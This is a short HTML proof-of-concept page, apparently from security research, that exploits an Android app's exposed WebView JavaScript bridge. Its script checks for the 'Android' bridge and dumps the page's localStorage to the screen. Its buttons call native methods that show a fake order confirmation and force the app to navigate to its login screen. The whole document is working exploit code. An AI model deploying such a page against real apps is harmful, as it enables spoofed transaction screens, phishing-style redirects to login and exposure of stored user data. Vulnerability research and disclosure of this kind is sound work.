<!DOCTYPE html>
<html>
<head>
    <title>Security Research - PoC</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; line-height: 1.6; }
        .status-box { padding: 15px; margin-bottom: 20px; border-radius: 8px; font-weight: bold; }
        .success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .failure { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        button { background: #000; color: #fff; border: none; padding: 12px 20px; border-radius: 5px; font-size: 16px; margin: 10px; cursor: pointer; width: 100%; max-width: 300px; }
        pre { background: #eee; padding: 10px; text-align: left; font-size: 12px; overflow-x: auto; }
    </style>
</head>
<body>

    <h1>Exploit Test Page</h1>
    
    <div id="bridgeStatus" class="status-box failure">
        Searching for 'Android' Bridge...
    </div>

    <button onclick="testOrderUI()">1. Trigger Fake Order UI</button><br>
    <button onclick="testDeepLink()">2. Redirect App to Login</button>

    <h3>Detected LocalStorage Data:</h3>
    <pre id="storageData">No data found yet.</pre>

    <script>
        // Check if the native bridge is present
        window.onload = function() {
            const statusDiv = document.getElementById('bridgeStatus');
            const storageDiv = document.getElementById('storageData');

            if (window.Android) {
                statusDiv.innerHTML = "✅ Bridge 'Android' Detected!";
                statusDiv.className = "status-box success";
                
                // Attempt to read LocalStorage (Impact verification)
                try {
                    const data = JSON.stringify(localStorage, null, 2);
                    storageDiv.innerText = data || "LocalStorage is empty, but accessible.";
                } catch (e) {
                    storageDiv.innerText = "Error reading storage: " + e.message;
                }
            } else {
                statusDiv.innerHTML = "❌ Bridge not found. Open this link inside the app.";
            }
        };

        function testOrderUI() {
            if (window.Android && window.Android.showOrderConfirmation) {
                // Using the method the CLI found to show a fake order screen
                window.Android.showOrderConfirmation("VULNERABLE-UI-TEST-999");
            } else {
                alert("Native method 'showOrderConfirmation' not found.");
            }
        }

        function testDeepLink() {
            if (window.Android && window.Android.navigateNativeDeepLink) {
                // Forcing the app to navigate to a native screen
                window.Android.navigateNativeDeepLink("://account/login");
            } else {
                alert("Native method 'navigateNativeDeepLink' not found.");
            }
        }
    </script>
</body>
</html>
